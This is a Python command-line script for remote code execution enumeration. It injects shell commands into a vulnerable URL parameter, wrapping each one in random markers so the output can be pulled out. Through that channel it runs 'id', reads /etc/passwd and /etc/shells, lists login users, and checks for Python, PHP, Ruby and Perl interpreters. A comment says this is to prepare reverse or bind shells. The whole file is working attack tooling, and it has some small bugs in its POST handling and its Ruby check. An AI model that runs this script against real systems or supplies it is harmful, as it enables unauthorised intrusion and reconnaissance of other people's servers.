#!/usr/bin/python3
"""
RCE Enumeration Script
"""
import requests,argparse,random,string,re

target = ''
method = 'GET'  # This is the default
post_data = ''
session_id = ''
gathered = {}



def main():
    global target,session_id
    parse_arguments()   # Parsing the given arguments
    session_id = generate_session_id(8)
    
    # Running the enumeration modules
    _get_uid()
    _get_etc_passwd()
    _get_available_shells()
    _get_login_users()
    _get_available_environments()

def parse_arguments():
    global target,method,post_data
    parser = argparse.ArgumentParser(description="Remote Code Execution Enumeration Script")
    parser.add_argument('--url','-u',dest='target',help='Specifies the Target URL')
    parser.add_argument('--method','-m',dest='method',help='Specifies used method GET / POST')
    parser.add_argument('--data','-d',dest='postdata',help='Specifies the data to send with POST')
    
    args = parser.parse_args()
    
    if args.target: target = args.target
    if args.method: method = args.method.upper()
    if args.postdata: post_data = args.postdata
        
def generate_session_id(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str
    
def send_request(uri):
    global method,post_data
    if method == "GET":
        response = requests.get(uri)
        return response.text
    else:
        response = response = requests.post(target,data=post_data)
        return response


    


def gather_info(name,data):
    gathered.update({name:data})
def run_command(command):
    uri = target.replace("RCE",'echo -n {SESS};{CMD};echo -n {SESS}'.format(SESS=session_id,CMD=command))
    response = send_request(uri)
    return response
    
def rex_get_value(response):
    try:
        pattern = r'{SESS}([\s.*\S]+){SESS}'.format(SESS=session_id)
        m = re.search(pattern,response,re.I|re.M)
        if m != None:
            result = m.group(1)
            return result
        else:
            return ""
    except Exception as x:
        print(x)
        
# Here comes the modules
def _get_uid():
    print("[+] Enumerating ID")
    try:
        cmd = 'id'
        uri = target.replace("RCE",'echo -n {SESS};{CMD};echo -n {SESS}'.format(SESS=session_id,CMD=cmd))
        response = send_request(uri)
        pattern = r'{SESS}([\s.*\S]+){SESS}'.format(SESS=session_id)
        m = re.search(pattern,response,re.I|re.M)
        result = m.group(1)
        gather_info('id',result);
        print(result)
        return m.group(1)
    except Exception as x:
        print("[x] {EXC}".format(EXC=x))
#---
def _get_etc_passwd():
    print("[+] Enumerating /etc/passwd")
    try:
        cmd = 'cat /etc/passwd'
        uri = target.replace("RCE",'echo -n {SESS};{CMD};echo -n {SESS}'.format(SESS=session_id,CMD=cmd))
        response = send_request(uri)
        pattern = r'{SESS}([\s.*\S]+){SESS}'.format(SESS=session_id)
        m = re.search(pattern,response,re.I|re.M)
        result = m.group(1)
        gather_info('passwd',result);
        print(result)
        return m.group(1)
    except Exception as x:
        print("[x] {EXC}".format(EXC=x))    
#---
def _get_available_shells():
    print("[+] Enumerating Shells")
    try:
        cmd = 'cat /etc/shells'
        uri = target.replace("RCE",'echo -n {SESS};{CMD};echo -n {SESS}'.format(SESS=session_id,CMD=cmd))
        response = send_request(uri)
        pattern = r'{SESS}([\s.*\S]+){SESS}'.format(SESS=session_id)
        m = re.search(pattern,response,re.I|re.M)
        result = m.group(1)
        gather_info('shells',result.splitlines());
        print(result)
        return m.group(1)
    except Exception as x:
        print("[x] {EXC}".format(EXC=x))     
def _get_login_users():
    global gathered
    print("[+] Enumerating Login Users")
    try:
        passwd = gathered['passwd']
        shells = gathered['shells']
        users = []
        for l in passwd.splitlines():
            r = l.split(':')    #root x 0 0 root /root /bin/bash
            if r[6] in shells:
                users.append(r[0])
                print(r[0])
        gather_info("login_users",users);
       
    except Exception as x:
        print("[x] {EXC}".format(EXC=x))  




def _check_ssh_keys():
    pass
def _get_available_environments():
    # Good for reverse snd bind shells
    print("[+] Gathering Environments")
    # Checking python
    data = {}
    resp = run_command('which python');
    if "python" in resp:
        resp = run_command('python2 --version');
        p2 = rex_get_value(resp)
        if p2 != "": print("[*] "+p2)
        resp = run_command('python3 --version');
        p3 = rex_get_value(resp)     
        if p3 != "": print("[*] "+p3)
        data.update({'python3':p3})
        data.update({'python2':p2})
    
    # Checking PHP
    resp = run_command('which php');
    if 'php' in resp:
        resp = run_command('php --version');
        php = rex_get_value(resp)
        if php != "": print("[*] "+php.splitlines()[0])
        data.update({'php':php.splitlines()[0]})
    gather_info('environments',data)
    
    # Checking for Ruby
    resp = run_command('which ruby');
    if 'ruby' in resp:
        resp = run_command('ruby --version');
        ruby = rex_get_value(resp)
        if php != "": print("[*] "+ruby)
        data.update({'ruby':ruby})
        
    gather_info('environments',data)
    
    # checking perl
    resp = run_command('which perl');
    if 'perl' in resp:
        resp = run_command('perl --version');
        m = re.search(r'(v[\d.]+)',resp,re.I|re.M)
        if m != None:
            perl = m.group(0) 
            print("[*] Perl "+perl)
            data.update({'perl':perl})
        
    gather_info('environments',data)    


# End of modules
if __name__ == '__main__':
    main()